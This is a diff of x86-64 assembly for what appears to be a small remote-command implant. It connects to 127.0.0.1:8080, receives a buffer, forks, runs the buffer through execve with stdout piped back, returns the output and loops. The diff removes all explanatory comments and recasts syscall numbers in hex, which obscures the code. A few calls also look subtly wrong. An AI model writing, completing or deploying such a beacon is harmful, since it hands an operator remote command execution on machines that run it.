@@ -1,9 +1,9 @@
 %macro clearBuffer 1
-  mov     rcx,    0
+  xor     rcx,    rcx
 %%_ne:
-  mov     QWORD [%1 + rcx], 0
-  add     rcx,    8
-  cmp     rcx,    256
+  mov     QWORD [%1 + rcx], 0x0
+  add     rcx,    0x8
+  cmp     rcx,    0x100
   jne     %%_ne
 %endmacro
 
@@ -11,130 +11,96 @@ section .text
   global _start
 
 _start:
-  push    DWORD   0
+  push    DWORD   0x0
   push    DWORD   0x0100007F
   push    WORD    0x901F
-  push    WORD    2
-
+  push    WORD    0x2
 _request:
-  ; socket()
-  mov     rax,    41
-  mov     edi,    2
-  mov     esi,    1
+  mov     rax,    0x29
+  mov     edi,    0x2
+  mov     esi,    0x1
   xor     rdx,    rdx
   syscall
-
-  ; connect()
-_tryConnect:
   mov     rdi,    rax
   mov     rsi,    rsp
-  mov     rdx,    DWORD 16
-  mov     rax,    42
+  mov     rdx,    DWORD 0x10
+  mov     rax,    0x2a
   syscall
   test    rax,    rax
-  jz      _connOk
-  mov     rax,    60
-  xor     rdi,    rdi
-  syscall
-
-_connOk:
+  jnz     _exit
   inc     rax
   mov     rsi,    output
   mov     rdx,    0x400
   syscall
-
-  ; read response
   xor     rax,    rax
   sub     rsp,    0x400
   mov     rsi,    rsp
   mov     rdx,    0x400
   syscall
   mov     r14,    rdi
-
-  ; pipe()
-  mov     rax,    22
+  mov     rax,    0x16
   mov     rdi,    QWORD fds
   syscall
-
-  ; fork()
-  mov     rax,    57
+  mov     rax,    0x39
   syscall
   mov     [pid],  rax
-
   test    rax,    rax
   jz      _childProc
-
 _parentProc:
-  ; close write end
-  mov     rax,    3
+  mov     rax,    0x3
   mov     rdi,    [fds+4]
   syscall
-
   clearBuffer output
-
-  ; read()
   xor     rax,    rax
   mov     rdi,    [fds]
   mov     rsi,    output
   mov     rdx,    0x400
   syscall
-
-  cmp     BYTE [output], 0
+  cmp     BYTE [output], 0x0
   jne     _continue
-  mov     BYTE [output], 1
-
+  mov     BYTE [output], 0x1
 _continue:
-
-  ; close read end
-  mov     rax,    3
+  mov     rax,    0x3
   mov     rdi,    [fds]
   syscall
-
-  ; close connection
-  mov     rax,    3
+  mov     rax,    0x3
   mov     rdi,    r14
   syscall
-
   clearBuffer rsp
   add     rsp,    0x400
-
   jmp     _request
-
 _childProc:
-  ; dup2()
-  mov     rax,    33
+  mov     rax,    0x21
   mov     rdi,    [fds+4]
   mov     rsi,    1
   syscall
-  ; close()
-  mov     rax,    3
+  mov     rax,    0x3
   mov     rdi,    fds
   syscall
-  ; close()
-  mov     rax,    3
+  mov     rax,    0x3
   mov     rdi,    [fds+4]
   syscall
-
-  ; execve()
-  mov     rax,    59
+  mov     rax,    0x3b
   mov     rdi,    rsp
   xor     rsi,    rsi
   xor     rdx,    rdx
   syscall
-
-  ; wait4()
-  mov     rax,    61
+  mov     rax,    0x3d
   xor     rdi,    rdi
   xor     rsi,    rsi
   xor     rdi,    rdi
   xor     r10,    r10
   syscall
+_exit:
+  mov     rax,    60
+  xor     rdi,    rdi
+  syscall
 
 section .bss
-  fds:    resd    2
-  pid:    resd    1
+  fds:    resd    0x2
+  pid:    resd    0x1
   output: resb    0x400
-  sockaddr: resq  2
+  sockaddr: resq  0x2
   msgbuf: resb    0x400
 
 section .data
